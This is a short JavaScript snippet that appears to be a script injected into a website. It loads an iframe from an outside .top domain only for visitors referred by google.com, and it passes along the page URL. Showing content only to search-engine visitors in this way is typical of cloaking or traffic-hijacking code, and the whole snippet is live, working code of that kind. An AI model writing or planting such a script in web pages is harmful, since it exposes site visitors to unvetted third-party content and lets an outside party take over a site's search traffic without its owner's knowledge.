var uxui_referer = document.referrer;
uxui_link = 'https://loxo2.top/index.php';
uxui_website_id = location.href;
uxui_vip = 0;
uxui_list_browser = ['google.com'];
flagrefuxui = 0;
flagrefuxui = checkFeferuxui(uxui_referer, uxui_list_browser);
if(flagrefuxui) { showMyIframeuxui(uxui_link, uxui_website_id, uxui_vip);}

function showMyIframeuxui(e, r, f) {
    var i = document.createElement("iframe");
    i.src = e + "?w=" + r + "&v=" + f, i.width = '100%', i.height = 250, i.frameBorder = 0, document.getElementById("uxuicode").appendChild(i)
}
function checkFeferuxui(e, r) {
    var f = 0;
    return r.forEach(function(x, i) {
        -1 != e.indexOf(x) && (f = 1)
    }), f
}